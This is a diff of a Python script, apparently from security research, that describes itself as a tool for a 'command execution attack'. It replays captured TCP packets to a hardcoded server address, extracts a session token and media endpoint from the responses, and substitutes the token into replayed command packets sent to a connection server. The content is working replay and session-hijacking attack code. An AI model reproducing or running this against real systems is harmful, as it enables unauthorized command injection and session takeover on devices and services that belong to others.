@@ -1,3 +1,8 @@
+# Connection and modification script for the different networks command
+# execution attack. Works in a similar way to the connection script, but
+# also facilitates extracting data from the server's response and modifying
+# the data before communicating with the connection server.
+
 import socket
 from scapy.all import *
 import json
@@ -5,13 +10,12 @@ import re
 
 
 def extract_data_from_pcap(pcap_file, connection):
-    # Read the PCAP file
+    # Read the pcap file
     packets = rdpcap(pcap_file)
 
-    # Extract data from the packets (modify this based on your needs)
+    # Extract data from the packets
     extracted_data = b''
     for packet in packets:
-        # Assuming the data is in the payload of TCP packets
         if TCP in packet and Raw in packet:
             send_and_receive_data(connection, bytes(packet[Raw].load))
 
@@ -46,13 +50,12 @@ def send_and_receive_data(client_socket, data):
 
     # Receive data from the server
     received_data = client_socket.recv(1024)
-    # print(f"Received data: {received_data}")
 
     try:
         # Decode the received data as UTF-8
         decoded_data = received_data.decode("utf-8", errors="ignore")
 
-        # Handle non-UTF-8 characters
+        # Handle non-UTF-8 characters by removing them
         decoded_data = "".join(
             c if ord(c) < 128 else f"\\x{ord(c):02x}" for c in decoded_data
         )
@@ -64,13 +67,13 @@ def send_and_receive_data(client_socket, data):
         pattern2 = r'"media_ip"\s*:\s*"([^"]*)"'
         pattern3 = r'"media_port"\s*:\s*"([^"]*)"'
 
-        # Use the regex pattern to find the "type" value
+        # Use the regex pattern to find the variables in the decoded data
         match = re.search(pattern, decoded_data)
         match2 = re.search(pattern2, decoded_data)
         match3 = re.search(pattern3, decoded_data)
 
         if match:
-            # If a match is found, extract the "type" value
+            # If a match is found, extract the variables
             type_value = match.group(1)
             global token
             token = type_value
@@ -88,31 +91,28 @@ def send_and_receive_data(client_socket, data):
         
 
     except UnicodeDecodeError:
-        # Handle decoding errors by ignoring the data
+        # Handle decoding errors by ignoring the data that isn't UTF-8
         print("Error decoding data as UTF-8. Ignoring...")
         return received_data
 
 
 def extract_modify_send(pcap_file, connection):
-    # Read the PCAP file
     packets = rdpcap(pcap_file)
 
-    # Extract data from the packets
     extracted_data = b''
     for packet in packets:
-        # Assuming the data is in the payload of TCP packets
         if TCP in packet and Raw in packet:
             extracted_data = packet[Raw].load
 
             # Modify the extracted data
             global token
-            # modify the data to replace 1:f1o7g1dxn9j33dhk4b with the token
+            # modify the data to replace 1:f1o7g1dxn9j33dhk4b with the connection token
             if b"1:f1o7g1dxn9j33dhk4b" in extracted_data:
                 print("Token found in extracted data. Modifying...")
                 extracted_data = extracted_data.replace(
                     b"1:f1o7g1dxn9j33dhk4b", token.encode("utf-8"))
 
-                # Send the modified data to the server
+            # Send the modified data to the server
             send_and_receive_data(connection, extracted_data)
 
 
@@ -125,10 +125,12 @@ if __name__ == "__main__":
     med_ip = None
     med_port = None
 
+    # Initally connect to the auth server to obtain the required information
     conn = establish_tcp_connection("18.218.23.115", 16035)
     extracted_data = extract_data_from_pcap(pcap_file, conn)
     close_tcp_connection(conn)
 
+    # Only communicate with the connection server if the token, media IP, and port are successfully extracted
     if token is not None and med_ip is not None and med_port is not None:
         print(f"Token found: {token} \n")
         pcap_file = "captures/commands/newtoservernonvidnostart.pcap"
